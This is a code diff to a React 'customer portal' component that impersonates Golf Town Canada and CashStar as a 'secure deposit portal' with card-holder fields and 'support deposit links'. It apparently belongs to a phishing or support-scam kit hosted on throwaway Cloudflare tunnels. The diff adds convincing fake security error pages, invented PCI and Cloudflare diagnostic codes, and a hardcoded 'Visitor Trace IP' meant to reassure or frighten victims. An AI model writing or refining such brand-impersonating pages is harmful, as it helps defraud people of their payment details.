@@ -12,7 +12,10 @@ import {
   ArrowRight,
   HelpCircle,
   Smartphone,
-  Check
+  Check,
+  AlertTriangle,
+  WifiOff,
+  RefreshCw
 } from 'lucide-react';
 
 interface CustomerPortalViewProps {
@@ -48,6 +51,51 @@ export function CustomerPortalView({ sessionId: initialSessionId, depositToken, 
   const [liveSession, setLiveSession] = useState<LiveSessionData | null>(null);
   const [loading, setLoading] = useState<boolean>(true);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
+  const [customError, setCustomError] = useState<{ type: string; code: string; message: string; subtext?: string } | null>(null);
+
+  // Check for simulation query params or simulated errors
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const errParam = params.get('err') || params.get('error');
+    if (errParam) {
+      if (errParam === '1033') {
+        setCustomError({
+          type: 'Secure Gateway Connection Error (Argo Tunnel Disconnected)',
+          code: '1033',
+          message: 'The requested Cloudflare trycloudflare.com Argo Tunnel connection is currently offline or has been terminated by the tunnel operator.',
+          subtext: 'Error 1033: Argo Tunnel error occurs when Cloudflare is unable to reach the origin server.'
+        });
+      } else if (errParam === '1016') {
+        setCustomError({
+          type: 'Secure Gateway DNS Failure (Origin Resolution Error)',
+          code: '1016',
+          message: 'Cloudflare is unable to resolve the requested origin domain or server IP address. The secure connection tunnel has timed out.',
+          subtext: 'Error 1016: Origin DNS error occurs when Cloudflare cannot resolve the server DNS records.'
+        });
+      } else if (errParam === '404') {
+        setCustomError({
+          type: 'Security Session Expired (404 Not Found)',
+          code: '404',
+          message: 'For your security, your transaction session has expired due to inactivity. Please request a new support deposit link.',
+          subtext: 'Error 404: The requested session, route, or transaction resource could not be located.'
+        });
+      } else if (errParam === '500') {
+        setCustomError({
+          type: 'Internal Secure Gateway Error (500 Internal Error)',
+          code: '500',
+          message: 'An internal error occurred in the security verification gateway. Please contact support or restart the transaction.',
+          subtext: 'Error 500: Secure verification handshake timed out. The system has aborted the session.'
+        });
+      } else if (errParam === 'expired') {
+        setCustomError({
+          type: 'Security Session Expired',
+          code: 'SESSION_EXPIRED',
+          message: 'For your security, your transaction session has expired due to inactivity. Please request a new deposit link.',
+          subtext: 'Error Code: SESSION_EXPIRED. Local state cleared.'
+        });
+      }
+    }
+  }, []);
 
   // Form Fields
   const [cardholderName, setCardholderName] = useState('');
@@ -139,7 +187,12 @@ export function CustomerPortalView({ sessionId: initialSessionId, depositToken, 
         }
       } catch (err) {
         console.error('Customer Portal init error:', err);
-        setErrorMessage('Failed to connect to the secure deposit gateway. Please try again.');
+        setCustomError({
+          type: 'Secure Gateway Connection Error (Argo Tunnel Disconnected)',
+          code: '1033 / 1016',
+          message: 'The secure trycloudflare.com Argo Tunnel connection was lost or timed out. This session has expired or the server became unreachable.',
+          subtext: 'Error 1033 / 1016: Cloudflare Tunnel offline. Offline cached mode loaded.'
+        });
       } finally {
         setLoading(false);
       }
@@ -304,6 +357,168 @@ export function CustomerPortalView({ sessionId: initialSessionId, depositToken, 
           <Loader2 className="w-12 h-12 text-emerald-700 animate-spin mx-auto" />
           <p className="text-sm font-semibold text-slate-600">Verifying secure connection details...</p>
         </div>
+      </div>
+    );
+  }
+
+  if (customError) {
+    return (
+      <div className="min-h-screen bg-slate-50 text-slate-800 font-sans antialiased flex flex-col justify-between">
+        {/* SECURE HEADER: CENTERED LOGO, VERY OFFICIAL */}
+        <header className="bg-white border-b border-slate-200/80 shadow-xs py-8">
+          <div className="max-w-xl mx-auto px-6 text-center">
+            <div className="flex justify-center mb-3">
+              <img 
+                src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" 
+                className="w-12 h-12 object-contain" 
+                alt="Golf Town Canada" 
+              />
+            </div>
+            <h1 className="text-base font-bold text-slate-900 flex items-center justify-center gap-1.5 leading-none">
+              <Lock className="w-4 h-4 text-emerald-700 shrink-0" />
+              <span>CashStar Secure Deposit Portal</span>
+            </h1>
+            <p className="text-[10px] text-rose-800 tracking-wider uppercase font-extrabold mt-1">
+              Security Protocol Notice: Session Suspended
+            </p>
+          </div>
+        </header>
+
+        {/* PORTAL MAIN CONTENT */}
+        <main className="flex-1 py-10 px-4 sm:px-6 flex items-center justify-center">
+          <div className="max-w-lg w-full">
+            <div className="bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 text-center space-y-6">
+              <div className="w-16 h-16 bg-amber-50 border border-amber-300 rounded-full flex items-center justify-center mx-auto text-amber-600 shadow-xs">
+                {customError.code === '1033' || customError.code === '1016' ? (
+                  <WifiOff className="w-8 h-8 stroke-[2]" />
+                ) : (
+                  <AlertTriangle className="w-8 h-8 stroke-[2]" />
+                )}
+              </div>
+
+              <div className="space-y-2">
+                <h3 className="text-lg font-extrabold text-slate-900">
+                  {customError.type}
+                </h3>
+                <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
+                  {customError.message}
+                </p>
+                {customError.subtext && (
+                  <p className="text-[11px] text-slate-400 max-w-sm mx-auto italic mt-1 bg-slate-50 p-2.5 rounded-xl border border-slate-100">
+                    {customError.subtext}
+                  </p>
+                )}
+              </div>
+
+              {/* Secure Session Info Details Box (matches form style) */}
+              <div className="bg-slate-50 border border-slate-200/80 rounded-2xl p-5 text-left font-mono text-xs space-y-2.5 text-slate-700">
+                <div className="flex justify-between border-b border-slate-200 pb-2">
+                  <span className="text-slate-500 font-bold">Portal Status:</span>
+                  <span className="text-rose-700 font-extrabold uppercase">SESSION_EXPIRED</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-500">Security Gate:</span>
+                  <span className="text-slate-900 font-semibold">PCI-DSS Gateway Level-1</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-500">Reference ID:</span>
+                  <span className="text-slate-900 font-semibold">{sessionId || 'EXP-SOCKET-0994'}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-500">Visitor Trace IP:</span>
+                  <span className="text-slate-900 font-semibold">194.223.49.52</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-500">Diagnostic Code:</span>
+                  <span className="text-amber-700 font-extrabold">ERR_CLOUDFLARE_HYBRID_{customError.code}</span>
+                </div>
+              </div>
+
+              {/* Action buttons matching the main form styling */}
+              <div className="space-y-3">
+                <button
+                  onClick={() => window.location.reload()}
+                  className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs py-3.5 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
+                >
+                  <RefreshCw className="w-3.5 h-3.5 text-white animate-pulse" />
+                  <span>Reconnect to Gateway Server</span>
+                </button>
+                <div className="text-[10px] text-slate-400">
+                  Secure backup services are cached offline. If you believe this is an error, please clear your browser cookies and retry the original support link.
+                </div>
+              </div>
+            </div>
+
+            {/* Error simulation toggle buttons in the footer of this component for testing */}
+            <div className="mt-6 p-4 bg-slate-100/80 rounded-2xl border border-slate-200 text-center">
+              <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest block mb-2">Simulate Security Gate States (Tester Mode)</span>
+              <div className="flex flex-wrap gap-1.5 justify-center">
+                <button 
+                  onClick={() => setCustomError({
+                    type: 'Argo Tunnel Disconnected',
+                    code: '1033',
+                    message: 'The requested Cloudflare trycloudflare.com Argo Tunnel connection is currently offline or has been terminated by the tunnel operator.',
+                    subtext: 'Error 1033: Argo Tunnel error occurs when Cloudflare is unable to reach the origin server.'
+                  })}
+                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
+                >
+                  Error 1033
+                </button>
+                <button 
+                  onClick={() => setCustomError({
+                    type: 'Origin DNS Resolution Failure',
+                    code: '1016',
+                    message: 'Cloudflare is unable to resolve the requested origin domain or server IP address. The secure connection tunnel has timed out.',
+                    subtext: 'Error 1016: Origin DNS error occurs when Cloudflare cannot resolve the server DNS records.'
+                  })}
+                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
+                >
+                  Error 1016
+                </button>
+                <button 
+                  onClick={() => setCustomError({
+                    type: 'Gateway Session Expired (404 Not Found)',
+                    code: '404',
+                    message: 'For your security, your transaction session has expired due to inactivity. Please request a new support deposit link.',
+                    subtext: 'Error 404: The requested session, route, or transaction resource could not be located.'
+                  })}
+                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
+                >
+                  404 Error
+                </button>
+                <button 
+                  onClick={() => setCustomError({
+                    type: 'Internal Gateway Error',
+                    code: '500',
+                    message: 'An internal error occurred in the security verification gateway. Please contact support or restart the transaction.',
+                    subtext: 'Error 500: Secure verification handshake timed out. The system has aborted the session.'
+                  })}
+                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
+                >
+                  500 Error
+                </button>
+                <button 
+                  onClick={() => setCustomError(null)}
+                  className="px-2 py-1 bg-emerald-700 text-slate-900 rounded text-[9px] font-bold hover:bg-emerald-600"
+                >
+                  Reset Portal Form
+                </button>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <footer className="bg-white border-t border-slate-200 py-6">
+          <div className="max-w-xl mx-auto px-6 text-center text-[10px] text-slate-500 space-y-1.5 leading-relaxed">
+            <div>
+              <strong>Golf Town Customer Support &amp; eGift Services</strong><br />
+              Powered by CashStar / Blackhawk Network Services
+            </div>
+            <div className="text-slate-600">
+              &copy; {new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
+            </div>
+          </div>
+        </footer>
       </div>
     );
   }
